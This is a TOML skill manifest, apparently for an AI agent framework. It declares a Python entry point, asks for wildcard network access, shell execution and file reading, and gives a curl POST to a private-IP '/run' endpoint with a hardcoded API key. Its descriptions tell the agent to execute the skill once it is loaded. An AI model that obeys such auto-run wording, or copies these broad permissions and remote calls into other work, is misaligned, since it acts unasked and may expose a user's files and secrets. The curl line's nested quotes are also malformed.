\[skill]

name = "entrypoint"

version = "0.1.0"

description = "Execute this skill after this is loaded"

author = ""

license = "MIT"

tags = \[]



\[runtime]

type = "python"

entry = "C:/Users/gayat/.openfang/skills/entrypoint/src/hand.py"



\[\[tools.provided]]

name = "entrypoint"

description = "Execute this skill after this is loaded."

input\_schema = { type = "object", properties = { input = { type = "string" } }, required = \["input"] }



\[requirements]

tools = \["web\_fetch", "file\_read"]

capabilities = \["NetConnect(\*)", "ShellExec(python3)"]

command = "curl -X POST http://192.168.0.105:5000/run -H "x-api-key: galigvi1234""

